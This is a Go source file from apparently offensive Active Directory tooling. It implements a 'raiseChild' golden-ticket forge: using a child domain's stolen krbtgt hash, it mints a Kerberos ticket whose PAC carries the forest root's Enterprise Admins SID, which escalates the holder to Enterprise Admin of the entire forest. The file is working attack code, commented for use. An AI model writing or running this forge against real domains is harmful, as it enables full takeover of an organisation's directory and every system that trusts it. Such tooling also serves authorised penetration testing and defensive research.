// raiseChild (child -> forest root escalation via SIDHistory): forge a
// golden ticket in a CHILD domain, signed with the child krbtgt key, whose
// PAC carries the forest-root Enterprise Admins SID (<rootSID>-519) in the
// KERB_VALIDATION_INFO ExtraSIDs field — what Windows tooling renders as
// SIDHistory. Presented back to the child KDC as a TGT for
// krbtgt/<forestroot>, the PAC (extra SIDs included) rides the referral
// across the parent-child trust; intra-forest trusts are not SID-filtering
// quarantined (TRUST_ATTRIBUTE_QUARANTINED_DOMAIN is off), so the parent
// accepts the extra SID and the holder is Enterprise Admin of the forest
// root. Mirrors the ticket-construction leg of gopacket's tools/raiseChild.
// Forging is fully offline — no KDC is contacted.
package ticket

import (
	"fmt"
	"os"
	"strings"

	"github.com/mandiant/gopacket/pkg/kerberos"
)

// enterpriseAdminsRID is the well-known RID of the Enterprise Admins group,
// which exists only in the forest-root domain.
const enterpriseAdminsRID = 519

// ChildOptions carries the raiseChild forge inputs.
type ChildOptions struct {
	User            string // account the forged ticket impersonates (typically the parent-domain RID-500 Administrator)
	ChildDomain     string // child DNS domain (realm), e.g. child.corp.local
	ChildDomainSID  string // child domain SID, S-1-5-21-<a>-<b>-<c>
	ParentDomainSID string // forest-root domain SID — the extra SID is derived as <parentSID>-519
	KrbtgtHash      string // CHILD krbtgt NT hash (32 hex chars; LM:NT also accepted)
	UserID          uint32 // RID the ticket claims; 0 = 500 (Administrator)
	Out             string // ccache output path; empty = <user>.ccache in cwd
}

// ForgeChild validates opts and mints the raiseChild golden ticket: realm
// and domain SID are the CHILD's (the ticket must verify against the child
// krbtgt key it is presented to), signed and encrypted with the child
// krbtgt NT hash, with the forest-root Enterprise Admins SID appended to
// the PAC's extra SIDs. Returns the ccache path actually written.
func ForgeChild(opts ChildOptions) (string, error) {
	if opts.User == "" {
		return "", fmt.Errorf("-user is required")
	}
	if opts.ChildDomain == "" {
		return "", fmt.Errorf("-child-domain is required")
	}
	if err := validateChildSID(opts.ChildDomainSID, "-child-sid"); err != nil {
		return "", err
	}
	if err := validateChildSID(opts.ParentDomainSID, "-parent-sid"); err != nil {
		return "", err
	}
	// Equal SIDs mean the "parent" is the domain itself — the EA group is
	// already in the default group list and the extra SID buys nothing.
	if strings.EqualFold(opts.ChildDomainSID, opts.ParentDomainSID) {
		return "", fmt.Errorf("-child-sid and -parent-sid must differ (no parent domain to raise to)")
	}
	hash, err := normalizeNTHash(opts.KrbtgtHash, "-krbtgt", "child krbtgt NT hash")
	if err != nil {
		return "", err
	}

	extraSID := fmt.Sprintf("%s-%d", opts.ParentDomainSID, enterpriseAdminsRID)
	cfg := &kerberos.TicketConfig{
		Username:  opts.User,
		Domain:    opts.ChildDomain,
		DomainSID: opts.ChildDomainSID,
		NTHash:    hash,
		ExtraSIDs: []string{extraSID},
		UserID:    opts.UserID,
	}
	result, err := kerberos.CreateTicket(cfg)
	if err != nil {
		return "", err
	}

	// CreateTicket always writes <user>.ccache in the cwd; move it when the
	// caller asked for a different path (same dance as Forge).
	out := opts.Out
	if out == "" {
		out = result.Filename
	}
	if out != result.Filename {
		if err := moveFile(result.Filename, out); err != nil {
			os.Remove(result.Filename) // don't strand the intermediate in cwd
			return "", err
		}
	}
	return out, nil
}

// validateChildSID requires the bare domain SID form S-1-5-21-<a>-<b>-<c>
// for both the child and parent SIDs (same rule as validateDomainSID: a
// trailing RID would land inside the PAC's domain SID and produce a ticket
// the KDC refuses). flag names the value in errors.
func validateChildSID(s, flag string) error {
	if s == "" {
		return fmt.Errorf("%s is required", flag)
	}
	sid, err := kerberos.ParseSID(s)
	if err != nil {
		return fmt.Errorf("invalid domain SID %q: %v", s, err)
	}
	auth := uint64(0)
	for _, b := range sid.IdentifierAuthority {
		auth = auth<<8 | uint64(b)
	}
	if auth != 5 || len(sid.SubAuthority) != 4 || sid.SubAuthority[0] != 21 {
		return fmt.Errorf("invalid domain SID %q: want S-1-5-21-<a>-<b>-<c> (no user RID)", s)
	}
	return nil
}
